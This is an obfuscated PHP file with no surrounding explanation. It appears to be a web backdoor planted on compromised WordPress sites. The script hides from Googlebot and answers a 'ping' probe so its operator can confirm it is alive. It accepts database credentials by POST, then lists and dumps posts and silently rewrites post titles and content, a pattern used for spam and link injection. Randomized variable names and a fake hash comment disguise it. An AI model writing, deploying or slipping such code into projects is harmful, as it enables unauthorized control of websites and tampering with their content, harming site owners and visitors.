<?php error_reporting(0);set_time_limit(0);@ini_set('memory_limit','512M');if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'googlebot')){header("HTTP/1.1 301 Moved Permanently");exit;}if(isset($_GET['ping'])){die("____APWORKING____");}if(isset($_POST['h'],$_POST['u'],$_POST['p'],$_POST['n'])){$okrbsYlO_B=$_POST['h'];$BsQodol=$_POST['u'];$sPlWyhqMLUUf=$_POST['p'];$Fi__Nsnyj=$_POST['n'];$sVmDEcYlemJ=(!isset($_POST['f']))?empty($_POST['f'])?'wp_':$_POST['f']:$_POST['f'];$EjMxrZiDhD=mysqli_connect($okrbsYlO_B,$BsQodol,$sPlWyhqMLUUf,$Fi__Nsnyj);$EjMxrZiDhD or die(json_encode(array('status' => 'db_error','msg' => mysqli_error($EjMxrZiDhD))));mysqli_set_charset($EjMxrZiDhD,"utf8");$prfKeSdTmY=$sVmDEcYlemJ.'posts';header('Content-Type: application/json');if(isset($_GET['show'])){$omnrocxgkhER=mysqli_query($EjMxrZiDhD,"SELECT * FROM `$prfKeSdTmY` WHERE `post_content` IS NOT NULL AND `post_status` NOT IN ('draft', 'auto-draft', 'future', 'pending', 'private', 'trash', 'inherit');");$JFMdwCHsW=mysqli_num_rows($omnrocxgkhER);if($JFMdwCHsW>0){$OXXukbaQDF=array();$itwgXNKTET=isset($_GET['show_content'])?true:false;while($obtCqJFptLaea=mysqli_fetch_assoc($omnrocxgkhER)){$kXnbWnW=$obtCqJFptLaea['ID'];$lVOJvzg_=$obtCqJFptLaea['post_date'];$YOniTnn=$obtCqJFptLaea['post_modified'];$_KyHbrUqW=$obtCqJFptLaea['post_type'];$WdClmYlXv=$obtCqJFptLaea['guid'];$_RRdzN_uKo=$obtCqJFptLaea['post_title'];$__yheQVaAJlwG=$obtCqJFptLaea['comment_count'];if(strlen($obtCqJFptLaea['post_content'])>1){if($itwgXNKTET){$oQhTIjR_fqdBW=$obtCqJFptLaea['post_content'];$MUazgCgoZfU=array('post_id' => $kXnbWnW,'post_date' => $lVOJvzg_,'post_modified' => $YOniTnn,'post_type' => $_KyHbrUqW,'guid' => $WdClmYlXv,'post_title' => $_RRdzN_uKo,'post_content' => $oQhTIjR_fqdBW,'comment_count' => $__yheQVaAJlwG);}else{$MUazgCgoZfU=array('post_id' => $kXnbWnW,'post_date' => $lVOJvzg_,'post_modified' => $YOniTnn,'post_type' => $_KyHbrUqW,'guid' => $WdClmYlXv,'post_title' => $_RRdzN_uKo,'comment_count' => $__yheQVaAJlwG);}$OXXukbaQDF[]=$MUazgCgoZfU;}}$JWYAZlC=array('status' => 'success','num_rows' => $JFMdwCHsW,'data' => $OXXukbaQDF);die(json_encode($JWYAZlC));}}elseif(isset($_GET['arid'])){$F_CwPBwqmj_=mysqli_escape_string($EjMxrZiDhD,$_GET['arid']);$_rvtxCh=mysqli_query($EjMxrZiDhD,"SELECT * FROM `$prfKeSdTmY` WHERE `ID` = '$F_CwPBwqmj_';");$JFMdwCHsW=mysqli_num_rows($_rvtxCh);if($JFMdwCHsW>0){$OXXukbaQDF=array();$obtCqJFptLaea=mysqli_fetch_assoc($_rvtxCh);$_KyHbrUqW=$obtCqJFptLaea['post_type'];$WdClmYlXv=$obtCqJFptLaea['guid'];$_RRdzN_uKo=$obtCqJFptLaea['post_title'];$oQhTIjR_fqdBW=$obtCqJFptLaea['post_content'];$JWYAZlC=array('status' => 'success','num_rows' => $JFMdwCHsW,'post_type' => $_KyHbrUqW,'guid' => $WdClmYlXv,'post_title' => $_RRdzN_uKo,'post_content' => $oQhTIjR_fqdBW);die(json_encode($JWYAZlC));}}elseif(isset($_GET['edit'])){if(isset($_POST['post_id'],$_POST['post_title'],$_POST['post_content'])){$kXnbWnW=mysqli_real_escape_string($EjMxrZiDhD,$_POST['post_id']);$_RRdzN_uKo=str_replace("'","\'",stripslashes($_POST['post_title']));$oQhTIjR_fqdBW=str_replace("'","\'",stripslashes($_POST['post_content']));mysqli_query($EjMxrZiDhD,"UPDATE $prfKeSdTmY SET `post_content`='$oQhTIjR_fqdBW', `post_title`='$_RRdzN_uKo' WHERE `ID`=$kXnbWnW;");if(mysqli_affected_rows($EjMxrZiDhD)>0){die(json_encode(array('status' => 'update_success')));}else{die(json_encode(array('status' => 'update_failed')));}}else{die(json_encode(array('status' => 'incomplete_data')));}}@mysqli_close($EjMxrZiDhD);}/* @hash: d41d8cd98f00b204e9800998ecf8427e - 54623a */